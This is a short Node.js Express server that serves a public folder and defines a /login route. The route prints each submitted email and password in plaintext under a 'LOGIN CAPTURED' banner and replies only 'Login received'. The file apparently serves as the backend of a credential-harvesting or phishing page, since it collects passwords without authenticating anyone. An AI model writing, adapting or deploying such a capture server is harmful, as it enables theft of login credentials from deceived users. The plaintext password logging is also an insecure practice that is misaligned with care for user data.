const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// serve files inside /public
app.use(express.static(path.join(__dirname, "public")));

app.post("/login", (req, res) => {
  const { email, password } = req.body;

  console.log("===== LOGIN CAPTURED =====");
  console.log("Email:", email);
  console.log("Password:", password);
  console.log("==========================");

  res.json({ message: "Login received" });
});

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});